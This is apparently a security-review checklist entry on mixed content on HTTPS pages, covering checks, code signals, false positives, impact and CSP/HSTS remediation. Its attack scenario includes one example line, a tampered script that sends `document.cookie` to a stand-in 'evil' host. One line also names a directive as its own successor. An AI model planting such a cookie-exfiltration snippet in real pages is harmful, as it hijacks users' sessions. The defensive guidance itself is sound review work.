---
id: P74
name: MixedContent
area: V12 Secure Communication
refs: ASVS V9.1.x, V9.2.x / WSTG-CRYP-03 / CS: Transport Layer Protection, Content Security Policy
requires: []
---

# P74 — Mixed Content

## Overview
Mixed Content occurs when an HTTPS-served page loads sub-resources — scripts, stylesheets, images, iframes, fonts, videos, or WebSocket connections — over an insecure `http://` origin. Because the page itself is encrypted, developers often assume it is fully protected, but any cleartext sub-resource request is observable and mutable by a network attacker (MITM). The root cause is hardcoded `http://` URLs in templates/assets, protocol-relative (`//cdn`) references that downgrade on an intercepted connection, or the use of plaintext `ws://` WebSockets. Modern browsers auto-block "active" mixed content (script, CSS, fetch, iframe) but may only warn on "passive" content (images, media), and legacy/custom clients may not block at all — leaving session data and integrity exposed.

## What to check
- Does any HTTPS page emit `src="http://..."`, `href="http://..."`, `action="http://..."`, or a `<link rel=stylesheet href="http://...">` to a sub-resource?
- Are protocol-relative URLs (`//cdn.example.com/lib.js`, `//ajax.googleapis.com`) still present? On a MITM/proxy that strips TLS they resolve to `http://`.
- Is any WebSocket opened with `ws://` instead of `wss://` (e.g. `new WebSocket('ws://...')`, Socket.IO without `secure: true`)?
- Does the response carry a `Content-Security-Policy` header with `upgrade-insecure-requests` (rewrites `http://` to `https://` at load time) or `block-all-mixed-content` (legacy directive)?
- Is `Strict-Transport-Security` (HSTS) set with `includeSubDomains` so that subresource hosts also force HTTPS?
- Are 301/308 redirects from `http://` origins to `https://` in place for every asset host? (Browsers still issue the initial cleartext request before following the redirect.)
- Do meta tags, JSON-LD, OpenGraph, sitemaps, or email templates embed absolute `http://` URLs that render in an HTTPS context?
- Are analytics tags, third-party widgets, or A/B-testing snippets loaded from `http://` origins?

## Static signals
Hardcoded cleartext URLs in templates/HTML:
- `<script src="http://cdn.example.com/lib.js"></script>`
- `<link rel="stylesheet" href="http://fonts.example.com/main.css">`
- `<img src="http://img.example.com/logo.png">`
- `<iframe src="http://partner.example.com/widget"></iframe>`

Protocol-relative references:
- `//cdn.example.com/lib.js`, `//ajax.googleapis.com/ajax/libs/jquery/...`
- `<a href="//example.com/path">` (downgrades if page fetched over http)

Plaintext WebSockets:
- JS: `new WebSocket('ws://app.example.com/socket')`
- Socket.IO: `io.connect('ws://host')` (missing `wss://` and `secure:true`)
- Reconnecting sockets, MQTT-over-WS, Phoenix channels with `ws://`

Backend / SSR templates embedding URLs:
- Node/EJS: `<script src="<%= config.cdnUrl %>">` where `cdnUrl` resolves to `http://`
- Python/Django: `<script src="{{ STATIC_URL }}js/app.js">` with `STATIC_URL=http://...`
- Java/Thymeleaf: `<script th:src="@{http://cdn.host/lib.js}">`
- Ruby/ERB: `<script src="<%= asset_path 'app', host: 'http://cdn...' %>">`
- PHP: `<script src="<?= $config['cdn'] ?>/lib.js">`

Missing CSP directives:
- Response headers without `Content-Security-Policy: ... upgrade-insecure-requests ...`
- No `block-all-mixed-content` (or its successor `block-all-mixed-content` behavior) on legacy-targeted pages
- HSTS header absent or missing `includeSubDomains`

## False positives
- All asset origins genuinely support HTTPS and CSP `upgrade-insecure-requests` is enforced — browsers rewrite `http://` to `https://` before the request leaves the device, so no cleartext hits the wire.
- Static analysis cannot read the front-end bundle or external templates — explicitly note this scope gap rather than inferring safety.
- The reference is inside a code example/documentation block (`<pre>`, `<code>`, a README rendered as text), not an actual loaded resource.
- The `http://` URL points to a host on `localhost` / a loopback or internal-only address used in a non-browser context (CLI tool, server-to-server fetch).
- The resource is loaded inside a sandboxed `<iframe>` with no access to parent credentials and is explicitly public/cacheable (lower risk, still worth flagging).

## Attack scenario
1. The victim logs into `https://app.example.com` over a hostile network (coffee-shop Wi-Fi, compromised ISP).
2. The page loads a script tag: `<script src="http://cdn.example.com/analytics.js"></script>`.
3. The attacker (MITM) intercepts the cleartext request to `cdn.example.com` and returns a tampered `analytics.js` containing `fetch('//evil/?c='+document.cookie)`.
4. The browser executes the injected script in the victim's authenticated origin (mixed-content blocking is bypassed or absent on this client/asset type).
5. The attacker exfiltrates the session cookie / bearer token, hijacks the account, or pivots to API calls as the victim.

## Impact
- **Confidentiality**: cleartext sub-resource requests leak cookies (if not `Secure`-flagged), authorization headers, and user-specific query parameters over the network.
- **Integrity**: an MITM can substitute active sub-resources (scripts, styles) and execute arbitrary code in the authenticated page — equivalent to a stored/reflected XSS delivered by the network path.
- **Availability**: tampered scripts can break or lock out functionality; passive content substitution can deface the UI.
- Severity scales with what the mixed resource can access: an active mixed script on an admin page is near-account-takeover; passive mixed images are typically low/indirect.

## Remediation
Serve every sub-resource over HTTPS and let the framework generate scheme-relative URLs; enforce a CSP that upgrades or blocks insecure requests:
```html
<!-- VULNERABLE — active mixed content over http -->
<script src="http://cdn.example.com/lib.js"></script>

<!-- SAFE — https origin, plus a CSP that upgrades any stray http:// -->
<script src="https://cdn.example.com/lib.js"></script>
```
```http
Content-Security-Policy: default-src 'self'; upgrade-insecure-requests; block-all-mixed-content
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```
Use `wss://` for all WebSockets and set HSTS with `includeSubDomains` so every asset host forces TLS — these together make mixed content both unexploitable and unrenderable, as defense-in-depth.

## References
- OWASP ASVS V9.1.x, V9.2.x — Communications security and transport layer requirements
- OWASP WSTG-CRYP-03 — Testing for Weak Transport Layer Security
- OWASP Cheat Sheets: Transport Layer Protection, Content Security Policy
- MDN: Mixed Content, `upgrade-insecure-requests`, `block-all-mixed-content`
